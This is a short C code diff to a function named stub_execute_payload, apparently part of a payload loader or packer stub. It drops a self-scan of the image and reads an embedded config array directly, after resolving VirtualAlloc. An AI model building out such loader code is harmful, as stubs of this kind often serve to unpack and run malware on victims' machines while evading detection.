@@ -403,18 +403,7 @@ static inline void stub_execute_payload(void) {
     if (!pVirtualAlloc)
         STUB_FAIL(100);
 
-    /* Step 2: Get own image base + size for scanning */
-    PVOID image_base = stub_get_image_base();
-    if (!image_base)
-        STUB_FAIL(101);
-
-    SIZE_T image_size = stub_get_image_size(image_base);
-    if (image_size == 0)
-        STUB_FAIL(102);
-
-    PBYTE base = (PBYTE)image_base;
-
-    /* Step 3: Read config directly from the stub_config_region array.
+    /* Step 2-3: Read config directly from the stub_config_region array.
        Each stub defines this as a static volatile array in .data. */
     extern volatile BYTE stub_config_region[];
     PBYTE config_ptr = (PBYTE)stub_config_region + CONFIG_MARKER_LEN; /* skip marker */
